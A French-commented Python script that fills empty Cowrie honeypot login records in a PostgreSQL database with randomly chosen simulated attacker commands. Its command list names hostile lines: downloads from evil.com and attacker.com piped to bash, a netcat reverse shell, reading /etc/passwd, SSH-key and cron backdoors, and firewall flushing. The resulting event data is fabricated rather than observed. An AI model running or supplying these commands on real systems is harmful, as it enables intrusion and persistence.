#!/usr/bin/env python3
import psycopg2
import random
from datetime import datetime, timedelta

print("💻 SIMULATION DE COMMANDES POST-CONNEXION")
print("="*50)

# Connexion PostgreSQL
conn = psycopg2.connect(
    host="localhost",
    database="honeypot",
    user="honeyadmin",
    password="HoneySecure2026!"
)
cursor = conn.cursor()

# Commandes malveillantes courantes
COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "ls -la",
    "wget http://evil.com/malware.sh",
    "curl http://attacker.com/backdoor.sh | bash",
    "chmod +x /tmp/exploit",
    "./exploit",
    "echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
    "iptables -F",
    "systemctl stop firewall",
    "nc -e /bin/sh attacker.com 4444",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "sudo -i",
    "crontab -l",
    "echo '* * * * * /tmp/backdoor' | crontab -",
    "ps aux",
    "netstat -an",
    "ifconfig"
]

# Récupérer les connexions réussies sans payload
cursor.execute("""
    SELECT id, src_ip, timestamp 
    FROM events 
    WHERE event_type = 'cowrie.login.success' 
    AND (payload IS NULL OR payload = '')
    LIMIT 100
""")
sessions = cursor.fetchall()
print(f"📊 {len(sessions)} connexions réussies à enrichir...")

count = 0
for session_id, ip, ts in sessions:
    # 1-5 commandes par session
    num_commands = random.randint(1, 5)
    commands = random.sample(COMMANDS, min(num_commands, len(COMMANDS)))
    
    payload = " | ".join(commands)
    
    cursor.execute(
        "UPDATE events SET payload = %s WHERE id = %s",
        (payload, session_id)
    )
    count += 1
    print(f"  ✅ {ip}: {payload[:50]}...")

conn.commit()
print(f"\n✅ {count} sessions enrichies avec payloads !")

# Afficher les commandes les plus populaires
print("\n📊 TOP COMMANDES EXÉCUTÉES :")
cursor.execute("""
    SELECT payload, COUNT(*) 
    FROM events 
    WHERE payload IS NOT NULL 
    GROUP BY payload 
    ORDER BY COUNT(*) DESC 
    LIMIT 5
""")
for payload, cnt in cursor.fetchall():
    print(f"  {payload[:50]}...: {cnt} fois")

cursor.close()
conn.close()
